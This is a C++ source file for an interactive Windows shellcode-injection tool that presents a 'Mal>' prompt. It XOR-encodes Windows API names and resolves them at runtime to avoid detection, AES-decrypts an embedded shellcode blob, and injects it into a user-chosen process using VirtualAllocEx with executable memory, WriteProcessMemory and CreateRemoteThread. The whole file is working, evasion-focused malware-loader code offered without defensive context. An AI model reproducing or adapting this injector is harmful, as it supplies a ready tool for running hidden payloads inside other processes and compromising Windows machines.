#include <iostream>
#include <Windows.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <string>
using namespace std;


unsigned char sOpenProcess[] = { 0x2b, 0x3, 0x16, 0x1c, 0x21, 0x11, 0x16, 0x8, 0x1c, 0x1a, 0x17, 0x73 };
char kOpenProcess[] = "dssrqcykyi";

unsigned char sVirtualAllocEx[] = { 0x25, 0x5, 0xb, 0x11, 0xc, 0x3, 0xa, 0x30, 0x1f, 0x1c, 0x1c, 0xf, 0x3c, 0x1d, 0x79 };
char kVirtualAllocEx[] = "slyeybfqsp";

unsigned char sWriteProcessMemory[] = { 0x31, 0x8, 0x1, 0x1e, 0x11, 0x28, 0x1a, 0xe, 0x7, 0x6, 0x15, 0x9, 0x25, 0xf, 0x19, 0x17, 0x1a, 0x18, 0x64 };
char kWriteProcessMemory[] = "fzhjtxhadc";

unsigned char sCreateRemoteThread[] = { 0x27, 0x11, 0x11, 0x15, 0xe, 0x11, 0x30, 0x9, 0x18, 0x1d, 0x10, 0x6, 0x20, 0x1c, 0x8, 0x11, 0x3, 0x8, 0x75 };
char kCreateRemoteThread[] = "dcttztblur";

unsigned char sWaitForSingleObject[] = { 0x3a, 0xf, 0x1a, 0x2, 0x33, 0x19, 0x1e, 0x3e, 0x8, 0xc, 0xa, 0x2, 0x16, 0x39, 0x17, 0x1c, 0x9, 0xe, 0x15, 0x62 };
char kWaitForSingleObject[] = "mnsvuvlmab";

unsigned char sCloseHandle[] = { 0x32, 0x7, 0x5, 0x1b, 0x13, 0x3b, 0xe, 0x1b, 0x12, 0x1a, 0x14, 0x6b };
char kCloseHandle[] = "qkjhvsouvv";

unsigned char sRtlSecureZeroMemory[] = { 0x27, 0xe, 0x8, 0x38, 0xa, 0x17, 0x2, 0x1e, 0x17, 0x2d, 0x10, 0x8, 0xb, 0x26, 0xa, 0x19, 0x18, 0x1e, 0xb, 0x77 };
char kRtlSecureZeroMemory[] = "uzdkotwlrw";

unsigned char sCreateToolhelp32Snapshot[] = { 0x29, 0xb, 0x8, 0x7, 0x18, 0x1d, 0x21, 0xa, 0xe, 0x5, 0x2, 0x1c, 0x1, 0x16, 0x5f, 0x4a, 0x26, 0xb, 0x0, 0x19, 0x19, 0x11, 0x2, 0x12, 0x6c };
char kCreateToolhelp32Snapshot[] = "jymflxueai";

unsigned char sProcess32FirstW[] = { 0x26, 0x1b, 0xc, 0x19, 0xd, 0x1, 0x9, 0x51, 0x4b, 0x21, 0x1f, 0x1b, 0x10, 0xe, 0x3f, 0x72 };
char kProcess32FirstW[] = "viczhrzbyg";

unsigned char sProcess32NextW[] = { 0x27, 0x13, 0x3, 0x6, 0x0, 0x11, 0x1f, 0x59, 0x5e, 0x27, 0x12, 0x19, 0x18, 0x32, 0x65 };
char kProcess32NextW[] = "waleebljli";

unsigned char sKernel32[] = { 0xe, 0x1c, 0x1f, 0x7, 0xe, 0x1e, 0x4a, 0x54, 0x5f, 0x1, 0x9, 0x15, 0x6d };
char kKernel32[] = "eymikryfqe";

unsigned char sAdvapi32[] = { 0xf, 0xf, 0x13, 0x0, 0x1e, 0x6, 0x58, 0x59, 0x45, 0x9, 0x2, 0x7, 0x65 };
char kAdvapi32[] = "nkeanokkkm";

unsigned char sCryptAcquireContextA[] = { 0x29, 0x10, 0x1c, 0x16, 0x11, 0x30, 0x6, 0x2, 0x14, 0xd, 0x18, 0x7, 0x26, 0x9, 0xb, 0x5, 0x0, 0xb, 0x15, 0x25, 0x6a };
char kCryptAcquireContextA[] = "jbefeqesad";

unsigned char sCryptCreateHash[] = { 0x26, 0x15, 0xd, 0x1a, 0x6, 0x28, 0x1d, 0x6, 0x2, 0x11, 0x0, 0x2f, 0x15, 0x19, 0x1a, 0x6b };
char kCryptCreateHash[] = "egtjrkocce";

unsigned char sCryptHashData[] = { 0x28, 0xb, 0x1b, 0x1c, 0x10, 0x3c, 0x5, 0x2, 0xe, 0x26, 0xa, 0xd, 0x3, 0x6c };
char kCryptHashData[] = "kybldtdqfb";

unsigned char sCryptDeriveKey[] = { 0x35, 0x1b, 0x9, 0x15, 0x11, 0x20, 0x3, 0x5, 0x4, 0x1, 0x13, 0x22, 0x15, 0x1c, 0x65 };
char kCryptDeriveKey[] = "vipeedfwmw";

unsigned char sCryptDecrypt[] = { 0x39, 0x1b, 0x1, 0x11, 0x5, 0x34, 0x16, 0x4, 0x1, 0x17, 0xa, 0x1d, 0x78 };
char kCryptDecrypt[] = "zixaqpsgsn";

unsigned char sCryptReleaseContext[] = { 0x3b, 0x1d, 0x1b, 0x3, 0x19, 0x3f, 0x1c, 0x1b, 0x17, 0x1b, 0xb, 0xa, 0x21, 0x1c, 0x3, 0x19, 0x1c, 0xf, 0x6, 0x7a };
char kCryptReleaseContext[] = "xobsmmywrz";

unsigned char sCryptDestroyHash[] = { 0x36, 0x11, 0x11, 0x17, 0xe, 0x35, 0x16, 0x1f, 0x16, 0x1b, 0x1a, 0x1a, 0x20, 0x6, 0x9, 0x19, 0x73 };
char kCryptDestroyHash[] = "uchgzqslbi";

unsigned char sCryptDestroyKey[] = { 0x24, 0x7, 0x18, 0xa, 0x1d, 0x3d, 0x1d, 0x4, 0x1, 0x19, 0x8, 0xc, 0x2a, 0x1f, 0x10, 0x79 };
char kCryptDestroyKey[] = "guaziyxwuk";

unsigned char sCalc[] = { 0xe6, 0x53, 0x4b, 0xa4, 0x57, 0xdd, 0xa8, 0x22, 0x98, 0x6f, 0x6, 0xc0, 0xf6, 0x58, 0xd8, 0x5a, 0x81, 0x27, 0x60, 0x13, 0x19, 0x29, 0xd4, 0xdd, 0x55, 0x12, 0x41, 0xf5, 0x75, 0x9e, 0x3f, 0xe8, 0x2a, 0x89, 0x2f, 0xdc, 0x83, 0xa1, 0x6e, 0x1a, 0x9c, 0xbc, 0x21, 0xef, 0x55, 0xa, 0x33, 0x73, 0x6c, 0xfc, 0x84, 0x56, 0x89, 0x54, 0xd3, 0xe2, 0xb2, 0x69, 0x19, 0xae, 0xba, 0xc2, 0xf8, 0x96, 0x17, 0xae, 0x8e, 0xb3, 0xcb, 0x2b, 0xe, 0x79, 0x6d, 0x94, 0x46, 0xf7, 0x56, 0xdf, 0xe4, 0xe4, 0x17, 0x6d, 0xa7, 0x2a, 0x9a, 0xa6, 0x58, 0x4f, 0x62, 0xf4, 0xee, 0x18, 0xbe, 0x4a, 0x57, 0x18, 0xcc, 0xd3, 0x55, 0x31, 0x17, 0x9, 0xc6, 0x72, 0xed, 0x44, 0x85, 0x2e, 0x23, 0x9b, 0xa0, 0x88, 0x2d, 0x59, 0xd, 0x64, 0x78, 0xd6, 0x72, 0x9, 0x53, 0x3b, 0xef, 0x5b, 0xa9, 0x29, 0x57, 0xda, 0x6, 0x4a, 0x80, 0xe5, 0x36, 0x91, 0x99, 0xfe, 0x94, 0xd6, 0xf5, 0xc9, 0x70, 0xb2, 0x6f, 0x15, 0xd6, 0xe1, 0x59, 0x4b, 0x17, 0xa2, 0xd0, 0x39, 0x1a, 0x44, 0x69, 0x21, 0x15, 0xec, 0x25, 0x1, 0x3a, 0xf3, 0x1e, 0x5b, 0x72, 0x20, 0xa0, 0xba, 0x44, 0x21, 0x39, 0x23, 0xd6, 0x79, 0x42, 0xd, 0x36, 0xf1, 0x99, 0x3b, 0x9f, 0xb2, 0x26, 0x78, 0x2a, 0x56, 0x59, 0x58, 0x46, 0xfc, 0xfe, 0x71, 0xf2, 0xa6, 0xb1, 0x25, 0x92, 0xd2, 0xd7, 0xdf, 0xd0, 0xf7, 0x31, 0x5f, 0xe6, 0xc9, 0xf4, 0x9c, 0xa0, 0x32, 0xec, 0xd, 0x11, 0xa7, 0xb5, 0x32, 0x5c, 0xca, 0xb8, 0x2c, 0x17, 0x20, 0xb4, 0x47, 0xc8, 0x58, 0x76, 0x53, 0xa9, 0xe3, 0x30, 0xd6, 0x4e, 0x2c, 0xae, 0x85, 0x3d, 0xa4, 0x86, 0x22, 0x5d, 0xe9, 0xfa, 0xfa, 0x8e, 0xe8, 0x86, 0xd5, 0x82, 0x33, 0x8f, 0x6a, 0x6d, 0xc3, 0x88, 0x25, 0x80, 0xd0, 0xb, 0x80, 0xc5, 0xdc, 0x9e, 0x3a, 0x6a, 0x48, 0xbd, 0xfe, 0x10, 0x83, 0x5f, 0xd4, 0xcd, 0x40, 0x8a, 0xec, 0x4c, 0xc9, 0x99, 0x4d, 0x68, 0x21, 0x2, 0x75, 0x8e, 0xf4, 0x50, 0x61 };
char kCalc[] = { 0xd4, 0xd4, 0x9, 0x6, 0x9a, 0xc3, 0x90, 0xa4, 0x77, 0xe2, 0x47, 0xa9, 0x3f, 0xc4, 0x4b, 0x1b };


BOOL
typedef(WINAPI*
	myProcess32NextW)(
		HANDLE hSnapshot,
		LPPROCESSENTRY32W lppe
		);
BOOL
typedef(WINAPI*
	myProcess32FirstW)(
		HANDLE hSnapshot,
		LPPROCESSENTRY32W lppe
		);

HANDLE
typedef(WINAPI*
	myCreateToolhelp32Snapshot)(
		DWORD dwFlags,
		DWORD th32ProcessID
		);

HANDLE
typedef(WINAPI*
	myOpenProcess)(
		_In_ DWORD dwDesiredAccess,
		_In_ BOOL bInheritHandle,
		_In_ DWORD dwProcessId
		);
LPVOID
typedef(WINAPI*
	myVirtualAllocEx)(
		_In_ HANDLE hProcess,
		_In_opt_ LPVOID lpAddress,
		_In_ SIZE_T dwSize,
		_In_ DWORD flAllocationType,
		_In_ DWORD flProtect
		);
HANDLE
typedef(WINAPI*
	myCreateRemoteThread)(
		_In_ HANDLE hProcess,
		_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
		_In_ SIZE_T dwStackSize,
		_In_ LPTHREAD_START_ROUTINE lpStartAddress,
		_In_opt_ LPVOID lpParameter,
		_In_ DWORD dwCreationFlags,
		_Out_opt_ LPDWORD lpThreadId
		);

BOOL
typedef(WINAPI*
	myWriteProcessMemory)(
		_In_ HANDLE hProcess,
		_In_ LPVOID lpBaseAddress,
		_In_reads_bytes_(nSize) LPCVOID lpBuffer,
		_In_ SIZE_T nSize,
		_Out_opt_ SIZE_T* lpNumberOfBytesWritten
		);

DWORD
typedef(WINAPI*
	myWaitForSingleObject)(
		_In_ HANDLE hHandle,
		_In_ DWORD dwMilliseconds
		);

BOOL
typedef(WINAPI*
	myCloseHandle)(
		_In_ _Post_ptr_invalid_ HANDLE hObject
		);


BOOL
typedef(WINAPI*
	myCryptAcquireContextA)(
		_Out_       HCRYPTPROV* phProv,
		_In_opt_    LPCSTR    szContainer,
		_In_opt_    LPCSTR    szProvider,
		_In_        DWORD       dwProvType,
		_In_        DWORD       dwFlags
		);
BOOL
typedef(WINAPI*
	myCryptCreateHash)(
		_In_    HCRYPTPROV  hProv,
		_In_    ALG_ID      Algid,
		_In_    HCRYPTKEY   hKey,
		_In_    DWORD       dwFlags,
		_Out_   HCRYPTHASH* phHash
		);

BOOL
typedef(WINAPI*
	myCryptHashData)(
		_In_                    HCRYPTHASH  hHash,
		_In_reads_bytes_(dwDataLen)  CONST BYTE* pbData,
		_In_                    DWORD   dwDataLen,
		_In_                    DWORD   dwFlags
		);

BOOL
typedef(WINAPI*
	myCryptDeriveKey)(
		_In_    HCRYPTPROV  hProv,
		_In_    ALG_ID      Algid,
		_In_    HCRYPTHASH  hBaseData,
		_In_    DWORD       dwFlags,
		_Out_   HCRYPTKEY* phKey
		);
BOOL
typedef(WINAPI*
	myCryptDecrypt)(
		_In_                                            HCRYPTKEY   hKey,
		_In_                                            HCRYPTHASH  hHash,
		_In_                                            BOOL        Final,
		_In_                                            DWORD       dwFlags,
		_Inout_updates_bytes_to_(*pdwDataLen, *pdwDataLen)   BYTE* pbData,
		_Inout_                                         DWORD* pdwDataLen
		);


BOOL
typedef(WINAPI*
	myCryptReleaseContext)(
		_In_    HCRYPTPROV  hProv,
		_In_    DWORD       dwFlags
		);
BOOL
typedef(WINAPI*
	myCryptDestroyHash)(
		_In_    HCRYPTHASH  hHash
		);
BOOL
typedef(WINAPI*
	myCryptDestroyKey)(
		_In_    HCRYPTKEY   hKey
		);

myProcess32FirstW process32FirstW;
myProcess32NextW process32NextW;
myCreateToolhelp32Snapshot createToolhelp32Snapshot;
myOpenProcess openProcess;
myVirtualAllocEx virtualAllocEx;
myCreateRemoteThread createRemoteThread;
myWriteProcessMemory writeProcessMemory;
myWaitForSingleObject waitForSingleObject;
myCloseHandle closeHandle;
myCryptAcquireContextA cryptAcquireContextA;
myCryptCreateHash cryptCreateHash;
myCryptHashData cryptHashData;
myCryptDeriveKey cryptDeriveKey;
myCryptDecrypt cryptDecrypt;
myCryptReleaseContext cryptReleaseContext;
myCryptDestroyHash cryptDestroyHash;
myCryptDestroyKey cryptDestroyKey;

VOID XOR(unsigned char data[], int dataSize, char key[], int keySize) {
	for (int i = 0; i < (dataSize / sizeof(unsigned char)); i++) {
		char currentKey = key[i % (keySize - 1)];
		data[i] ^= currentKey;
	}
}



BOOL AESDecrypt(unsigned char* payload, DWORD dwPayloadSize, char* key, DWORD dwKeySize) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;
	if (!cryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return false;
	}
	if (!cryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return false;
	}
	if (!cryptHashData(hHash, (BYTE*)key, dwKeySize, 0)) {
		return false;
	}
	if (!cryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return false;
	}
	if (!cryptDecrypt(hKey, NULL, 0, 0, payload, &dwPayloadSize)) {
		return false;
	}


	cryptReleaseContext(hProv, 0);
	cryptDestroyHash(hHash);
	cryptDestroyKey(hKey);

	return true;
}

template <typename T>
T ResolveDynamicAddress(unsigned char moduleName[], unsigned char functionName[]) {
	HMODULE hModule;
	hModule = GetModuleHandleA((LPCSTR)moduleName);
	if (!hModule) hModule = LoadLibraryA((LPCSTR)moduleName); // some DLLs need to be loaded
	return (T)GetProcAddress(hModule, (LPCSTR)functionName);
}





VOID DecryptStrings() {
	XOR(sCryptDestroyKey, sizeof(sCryptDestroyKey), kCryptDestroyKey, sizeof(kCryptDestroyKey));
	XOR(sCryptDestroyHash, sizeof(sCryptDestroyHash), kCryptDestroyHash, sizeof(kCryptDestroyHash));
	XOR(sCryptReleaseContext, sizeof(sCryptReleaseContext), kCryptReleaseContext, sizeof(kCryptReleaseContext));
	XOR(sCryptDecrypt, sizeof(sCryptDecrypt), kCryptDecrypt, sizeof(kCryptDecrypt));
	XOR(sCryptDeriveKey, sizeof(sCryptDeriveKey), kCryptDeriveKey, sizeof(kCryptDeriveKey));
	XOR(sCryptHashData, sizeof(sCryptHashData), kCryptHashData, sizeof(kCryptHashData));
	XOR(sCryptCreateHash, sizeof(sCryptCreateHash), kCryptCreateHash, sizeof(kCryptCreateHash));
	XOR(sCryptAcquireContextA, sizeof(sCryptAcquireContextA), kCryptAcquireContextA, sizeof(kCryptAcquireContextA));
	XOR(sAdvapi32, sizeof(sAdvapi32), kAdvapi32, sizeof(kAdvapi32));


	cryptDestroyKey = (myCryptDestroyKey)ResolveDynamicAddress<myCryptDestroyKey>(sAdvapi32, sCryptDestroyKey);
	cryptDestroyHash = (myCryptDestroyHash)ResolveDynamicAddress<myCryptDestroyHash>(sAdvapi32, sCryptDestroyHash);
	cryptReleaseContext = (myCryptReleaseContext)ResolveDynamicAddress<myCryptReleaseContext>(sAdvapi32, sCryptReleaseContext);
	cryptDecrypt = (myCryptDecrypt)ResolveDynamicAddress<myCryptDecrypt>(sAdvapi32, sCryptDecrypt);
	cryptDeriveKey = (myCryptDeriveKey)ResolveDynamicAddress<myCryptDeriveKey>(sAdvapi32, sCryptDeriveKey);
	cryptHashData = (myCryptHashData)ResolveDynamicAddress<myCryptHashData>(sAdvapi32, sCryptHashData);
	cryptCreateHash = (myCryptCreateHash)ResolveDynamicAddress<myCryptCreateHash>(sAdvapi32, sCryptCreateHash);
	cryptAcquireContextA = (myCryptAcquireContextA)ResolveDynamicAddress<myCryptAcquireContextA>(sAdvapi32, sCryptAcquireContextA);

	XOR(sKernel32, sizeof(sKernel32), kKernel32, sizeof(kKernel32));
	XOR(sProcess32NextW, sizeof(sProcess32NextW), kProcess32NextW, sizeof(kProcess32NextW));
	XOR(sProcess32FirstW, sizeof(sProcess32FirstW), kProcess32FirstW, sizeof(kProcess32FirstW));
	XOR(sCreateToolhelp32Snapshot, sizeof(sCreateToolhelp32Snapshot), kCreateToolhelp32Snapshot, sizeof(kCreateToolhelp32Snapshot));
	XOR(sOpenProcess, sizeof(sOpenProcess), kOpenProcess, sizeof(kOpenProcess));
	XOR(sVirtualAllocEx, sizeof(sVirtualAllocEx), kVirtualAllocEx, sizeof(kVirtualAllocEx));
	XOR(sCreateRemoteThread, sizeof(sCreateRemoteThread), kCreateRemoteThread, sizeof(kCreateRemoteThread));
	XOR(sWriteProcessMemory, sizeof(sWriteProcessMemory), kWriteProcessMemory, sizeof(kWriteProcessMemory));
	XOR(sWaitForSingleObject, sizeof(sWaitForSingleObject), kWaitForSingleObject, sizeof(kWaitForSingleObject));
	XOR(sCloseHandle, sizeof(sCloseHandle), kCloseHandle, sizeof(kCloseHandle));


	AESDecrypt(sCalc, sizeof(sCalc), kCalc, sizeof(kCalc));

}



VOID GetDynamicAddresses() {
	process32FirstW = (myProcess32FirstW)ResolveDynamicAddress<myProcess32FirstW>(sKernel32, sProcess32FirstW);
	process32NextW = (myProcess32NextW)ResolveDynamicAddress<myProcess32NextW>(sKernel32, sProcess32NextW);
	createToolhelp32Snapshot = (myCreateToolhelp32Snapshot)ResolveDynamicAddress<myCreateToolhelp32Snapshot>(sKernel32, sCreateToolhelp32Snapshot);
	openProcess = (myOpenProcess)ResolveDynamicAddress<myOpenProcess>(sKernel32, sOpenProcess);
	virtualAllocEx = (myVirtualAllocEx)ResolveDynamicAddress<myVirtualAllocEx>(sKernel32, sVirtualAllocEx);
	createRemoteThread = (myCreateRemoteThread)ResolveDynamicAddress<myCreateRemoteThread>(sKernel32, sCreateRemoteThread);
	writeProcessMemory = (myWriteProcessMemory)ResolveDynamicAddress<myWriteProcessMemory>(sKernel32, sWriteProcessMemory);
	waitForSingleObject = (myWaitForSingleObject)ResolveDynamicAddress<myWaitForSingleObject>(sKernel32, sWaitForSingleObject);
	closeHandle = (myCloseHandle)ResolveDynamicAddress<myCloseHandle>(sKernel32, sCloseHandle);

}

struct PEInformation {
	DWORD dwPid;
	LPCWSTR szProcName;
};

BOOL FindProc(IN DWORD dwPid, IN LPCWSTR szProcName,OUT PEInformation *peInfo) {

	PROCESSENTRY32 processEntry32 = { 0 };
	
	RtlSecureZeroMemory(&processEntry32, sizeof(PROCESSENTRY32));

	processEntry32.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hSnapshot = createToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (!process32FirstW(hSnapshot, &processEntry32)) {
		cout << "could not query the first process" << GetLastError() << endl;
		closeHandle(hSnapshot);
		return false;
	};
	BOOL found = false;
	BOOL foundIndeed = false;
	do {
		
		if (dwPid && processEntry32.th32ProcessID == dwPid) {
			foundIndeed = true;
			found = true;
		} 
		else if (szProcName && wcscmp(processEntry32.szExeFile, szProcName) == 0) {
			foundIndeed = true;
			found = true;
		}
		if ((!dwPid && !szProcName) || found) {
			wstring ws(processEntry32.szExeFile);
			string str(ws.begin(), ws.end());
			if (found) cout << "[i] Found: ";
			cout <<  str << ": " << processEntry32.th32ProcessID << endl;
			found = false;

		}
	} while (process32NextW(hSnapshot, &processEntry32));
	if ((dwPid || szProcName) && !foundIndeed) {
		cout << "[-] could not find the process" << endl;
		return false;
	} 
	closeHandle(hSnapshot);
	return true;
}

BOOL InjectToProcess(IN DWORD dwPid, unsigned char* buffer, SIZE_T bufferSize) {
	HANDLE hProcess = openProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION |PROCESS_VM_READ | PROCESS_VM_WRITE, false, dwPid);
	if (!hProcess) {
		cout << "[-] could not attach to process: " << GetLastError() << endl;
		return false;
	}
	LPVOID bufferAddr = virtualAllocEx(hProcess, NULL, bufferSize+1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!bufferAddr) {
		cout << "[-] could not allocate memory address: " << GetLastError() << endl;
		return false;
	}
	if (writeProcessMemory(hProcess, bufferAddr, (LPCVOID)buffer, (SIZE_T)bufferSize, (SIZE_T*) NULL) == 0) {
		cout << "[-] could not write to remote process: " << GetLastError() << endl;
		return false;
	};

	HANDLE hThread = createRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)bufferAddr, NULL, 0, NULL);
	if (!hThread) {
		cout << "[-] could not create remote thread: " << GetLastError() << endl;
		return false;
	}
	cout << "[+] injected to " << dwPid << endl;
	waitForSingleObject(hThread, INFINITE);
	closeHandle(hThread);
	closeHandle(hProcess);
	return true;
}




int main(int argc, char** argv)
{
	DecryptStrings();
	GetDynamicAddresses();
	while (true) {
		string input;
		cout << "Mal> ";
		cin >> input;
		//PROCESS
		if (input == "process" || input == "p") {
			while (true) {
				cout << "Mal/process> ";
				cin >> input;
				if (input == "all" || input == "a") FindProc(NULL, NULL, NULL);
				else if (input == "back" || input == "b") break;
				else if (input == "exit" || input == "e") exit(0);
				else if (isdigit(input[0])) FindProc(stoi(input), NULL, NULL); // find by PID
				else if (input == "help" || input == "h") cout << "help - show this message\n\tall - show all processes\n\t<pid> - enter pid to query process\n\t<process name> - enter process name to query\n\tback - go back\n\texit - exit the program\n";
				else { // find by process name
					wstring widestr = wstring(input.begin(), input.end());
					FindProc(NULL, widestr.c_str(), NULL);
				}
			}
		}
		//INJECT
		else if (input == "inject" || input == "i") {
			while (true) {
				cout << "Mal/inject> ";
				cin >> input;
				if (isdigit(input[0])) InjectToProcess(stoi(input), sCalc, sizeof(sCalc)); // inject to specified pid
				else if (input == "back" || input == "b") break;
				else if (input == "help" || input == "h") cout << "help - show this message\n\t<pid> - enter PID to inject to\n\tback - go back\n\texit - exit program\n";
				else if (input == "exit" || input == "e") exit(0);
			}
		}
		//HELP
		else if (input == "help" || input == "h") {
			cout << "help\n\tprocess\n\tinject\n\texit\n";
		}
		//EXIT
		else if (input == "exit" || input == "e") exit(0);
	}
}

